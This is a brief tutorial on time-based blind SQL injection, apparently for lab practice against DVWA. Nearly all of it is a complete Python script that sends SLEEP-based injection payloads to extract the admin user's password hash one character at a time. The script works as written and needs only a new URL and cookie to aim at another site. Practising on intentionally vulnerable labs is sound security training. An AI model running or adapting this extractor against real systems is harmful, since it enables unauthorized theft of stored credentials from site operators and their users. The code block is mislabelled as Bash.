# SQL-injection
Blind SQL injection occurs when an application is vulnerable to SQL injection but does not return error messages or data directly. Instead, you infer information by observing behavior — like response time or true/false responses.

Time-based blind SQL injection** uses commands like `SLEEP(5)` to cause intentional delays. If the response takes 5 seconds, you know the condition was true.

Bash code:

#!/usr/bin/env python3
import requests
import time
import sys

# Target URL
url = "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/"

# Your session cookie (get from browser)
cookies = {
    "security": "low",
    "PHPSESSID": "YOUR_COOKIE_HERE"  # Replace with actual cookie
}

# Characters that can appear in MD5 hash (0-9, a-f)
chars = "0123456789abcdef"

def test_character(position, character):
    """
    Test if the character at given position matches.
    Returns True if delay occurs (character matches)
    """
    payload = f"1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),{position},1)='{character}', SLEEP(3), 0) AND '1'='1"
    
    params = {"id": payload, "Submit": "Submit"}
    
    # Start timer
    start = time.time()
    
    try:
        response = requests.get(url, params=params, cookies=cookies, timeout=10)
        elapsed = time.time() - start
        
        # If response took longer than 2.5 seconds, condition was TRUE
        return elapsed > 2.5
    except:
        return False

def extract_hash():
    """Extract full 32-character MD5 hash"""
    hash_value = ""
    
    print("=" * 50)
    print("Blind SQL Injection - Admin Password Hash Extractor")
    print("=" * 50)
    print(f"Testing characters: {chars}")
    print()
    
    for position in range(1, 33):  # MD5 hash is 32 characters
        found = False
        
        for char in chars:
            sys.stdout.write(f"\rPosition {position}: testing '{char}'...")
            sys.stdout.flush()
            
            if test_character(position, char):
                hash_value += char
                print(f"\rPosition {position}: found '{char}' -> Hash: {hash_value}")
                found = True
                break
        
        if not found:
            print(f"\rPosition {position}: NOT FOUND! Stopping.")
            break
    
    print("\n" + "=" * 50)
    print(f"Full Hash: {hash_value}")
    print("=" * 50)
    return hash_value

if __name__ == "__main__":
    print("Starting blind SQL injection attack...")
    print("Each character takes up to 3 seconds to test.")
    print("Total time: up to 32 * 16 * 3 = 1536 seconds (25 minutes)\n")
    
    result = extract_hash()
    
    # Verify with known hash
    known_hash = "21232f297a57a5a743894a0e4a801fc3"
    if result == known_hash:
        print("\n[✓] VERIFIED: Hash matches!")
    else:
        print(f"\n[!] Expected: {known_hash}")
        print(f"[!] Got:      {result}")


